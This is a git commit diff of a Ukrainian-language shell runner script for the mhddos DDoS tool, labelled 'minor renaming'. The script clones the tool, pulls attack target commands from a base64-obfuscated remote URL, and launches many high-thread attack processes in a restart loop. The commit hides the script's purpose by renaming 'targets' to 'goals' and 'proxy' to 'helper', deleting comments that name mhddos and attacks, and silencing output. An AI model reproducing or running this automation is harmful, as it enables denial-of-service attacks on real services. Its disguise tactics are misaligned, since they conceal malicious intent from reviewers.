94d58f796456c30d065cf6431ad9a146671f08f1
Alexey Danilov <oleksii.danilov@games24x7.com>
2022-04-02 15:10:57 +0300

    minor renaming

--- runner.new.sh
+++ runner.new.sh
@@ -14,7 +14,7 @@ if [[ ${PIPESTATUS[0]} -ne 4 ]]; then
 fi
 
 OPTIONS=u:e:
-LONGOPTS=url-with-targets:,execution-id:
+LONGOPTS=url-with-goals:,execution-id:
 
 # -regarding ! and PIPESTATUS see above
 # -temporarily store output to be able to check for errors
@@ -35,15 +35,14 @@ thread_count="$(( $RANDOM % 150 + 150 ))"
 process_count="$(( $RANDOM % 10 + 10 ))"
 stats_interval="$(( $RANDOM % 45 + 45 ))"
 
-# url_with_targets="https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets"
-url_with_targets=$(echo 'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0FydWllbTIzNC9hdXRvX21oZGRvcy9tYWluL3J1bm5lcl90YXJnZXRzCg==' | base64 -d)
+url_with_goals=$(echo 'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0FydWllbTIzNC9hdXRvX21oZGRvcy9tYWluL3J1bm5lcl90YXJnZXRzCg==' | base64 -d)
 execution_id="${EXECUTION_ID:-2b089943-9daa-4990-85a0-8d8855d67572}"
 
 # now enjoy the options in order and nicely split until we see --
 while true; do
     case "$1" in
-        -u|--url-with-targets)
-            url_with_targets="$2"
+        -u|--url-with-goals)
+            url_with_goals="$2"
             shift 2
             ;;
         -e|--execution-id)
@@ -61,73 +60,71 @@ while true; do
     esac
 done
 
-# "mhddos"
 TOOL=$(echo 'bWhkZG9zCg==' | base64 -d)
 
-PROXY_PROJECT_NAME=$execution_id
-#PROXY_PROJECT_VERSION=addeea253d53bbf90d0a320367d8974183c4b480
-PROXY_PROJECT_VERSION=309c4ab160c99b2e85496bbaf76611098cc1294c
-PROXY_PROJECT_URL=$(echo 'aHR0cHM6Ly9naXRodWIuY29tL3BvcnRob2xlLWFzY2VuZC1jaW5uYW1vbi9taGRkb3NfcHJveHkuZ2l0Cg==' | base64 -d)
+HELPER_PROJECT_NAME=$execution_id
+HELPER_PROJECT_VERSION=309c4ab160c99b2e85496bbaf76611098cc1294c
+HELPER_PROJECT_URL=$(echo 'aHR0cHM6Ly9naXRodWIuY29tL3BvcnRob2xlLWFzY2VuZC1jaW5uYW1vbi9taGRkb3NfcHJveHkuZ2l0Cg==' | base64 -d)
 
-PROXY_DIR=~/$PROXY_PROJECT_NAME
-PROXY_FILE=$PROXY_DIR/${TOOL}/files/proxies/proxies.txt
+HELPER_DIR=~/$HELPER_PROJECT_NAME
+HELPER_FILE=$HELPER_DIR/${TOOL}/files/proxies/proxies.txt
 
 echo "ініціалізація..."
 
 # make sure ifstat and awk are installed
-apt-get install ifstat gawk -y #&> /dev/null
+apt-get install ifstat gawk -y &> /dev/null
 
 # remove unnecessary built-in python dependencies
-python3 -m pip uninstall google-colab datascience -y #&> /dev/null
-python3 -m pip install --upgrade pip #&> /dev/null
+python3 -m pip uninstall google-colab datascience -y &> /dev/null
+python3 -m pip install --upgrade pip &> /dev/null
 
 # run within user directory
 cd ~
 
 # delete old proxy dir if present
-if [ -d $PROXY_DIR ]; then
-    rm -r $PROXY_DIR #&> /dev/null
+if [ -d $HELPER_DIR ]; then
+    rm -r $HELPER_DIR &> /dev/null
 fi
 
 # download specific mhddos_proxy version
-git clone $PROXY_PROJECT_URL $PROXY_PROJECT_NAME #&> /dev/null
-cd $PROXY_DIR
-git checkout $PROXY_PROJECT_VERSION #&> /dev/null
+git clone $HELPER_PROJECT_URL $HELPER_PROJECT_NAME &> /dev/null
+cd $HELPER_DIR
+git checkout $HELPER_PROJECT_VERSION &> /dev/null
 
 # install mhddos_proxy dependencies
-python3 -m pip install -r requirements.txt #&> /dev/null
+python3 -m pip install -r requirements.txt &> /dev/null
 
-mv $PROXY_DIR/"$(echo 'cnVubmVyLnB5Cg==' | base64 -d)" $PROXY_DIR/$execution_id.py
-echo "# $execution_id" >> $PROXY_DIR/$execution_id.py
+mv $HELPER_DIR/"$(echo 'cnVubmVyLnB5Cg==' | base64 -d)" $HELPER_DIR/$execution_id.py
+echo "# $execution_id" >> $HELPER_DIR/$execution_id.py
 
 echo "ініціалізацію завершено"
 
-# Restart attacks and update targets every $refresh_interval
-#while true
-#do
-    # kill old copies of mhddos_proxy
+# Restarts task and updates goals every $refresh_interval
+while true
+do
+    # stop all processes
     echo "(ре)старт програми..."
     if pgrep -f $execution_id.py &> /dev/null; then pkill -f $execution_id.py &> /dev/null; fi
     if pgrep -f ifstat &> /dev/null; then pkill -f ifstat &> /dev/null; fi
     echo "(ре)старт програми завершено"
 
     # delete old proxy file if present
-    if [ -f $PROXY_FILE ]; then
-        rm $PROXY_FILE
+    if [ -f $HELPER_FILE ]; then
+        rm $HELPER_FILE
     fi
 
-    # load targets and process them one-by-one
-    curl -s $url_with_targets | cat | grep "^[^#]" | while read -r target_command ; do
+    # load file and process them one-by-one
+    curl -s $url_with_goals | cat | grep "^[^#]" | while read -r goal_command ; do
       for (( i=1; i<=process_count; i++ ))
       do
-          cd $PROXY_DIR
-          python3 $execution_id.py $target_command -t $thread_count -p 25200 --rpc 1000&
+          cd $HELPER_DIR
+          python3 $execution_id.py $goal_command -t $thread_count -p 25200 --rpc 1000 &> /dev/null&
 
-          # wait till the first process initializes proxy file properly
-          if [ ! -f $PROXY_FILE ]; then
+          # wait till the first process initializes helper file properly
+          if [ ! -f $HELPER_FILE ]; then
               echo "перевірка середовища..."
 
-              while [ ! -f $PROXY_FILE ]
+              while [ ! -f $HELPER_FILE ]
               do
                   sleep 1
               done
@@ -136,26 +133,9 @@ echo "ініціалізацію завершено"
           fi
       done
   done
-  echo -e "працюємо з $target_command; oновлення через $refresh_interval\n"
+  echo -e "працюємо з $goal_command; oновлення через $refresh_interval\n"
 
   ifstat -i eth0 -t -b -n $stats_interval/$stats_interval | awk '$1 ~ /^[0-9]{2}:/{$2/=1024;$3/=1024;printf "[%s] %10.2f ↓MBit/s↓  %10.2f ↑MBit/s↑\n",$1,$2,$3}'&
 
-  echo "Before sleep"
-
-  sleep 2m
-
-  echo "After sleep"
-
-  ps ax
-
-  # kill old copies of mhddos_proxy
-  echo "(ре)старт програми..."
-  if pgrep -f $execution_id.py &> /dev/null; then pkill -f $execution_id.py &> /dev/null; fi
-  if pgrep -f ifstat &> /dev/null; then pkill -f ifstat &> /dev/null; fi
-  echo "(ре)старт програми завершено"
-
-  echo "After pkill"
-
-  #sleep $refresh_interval
-
-#done
+  sleep $refresh_interval
+done
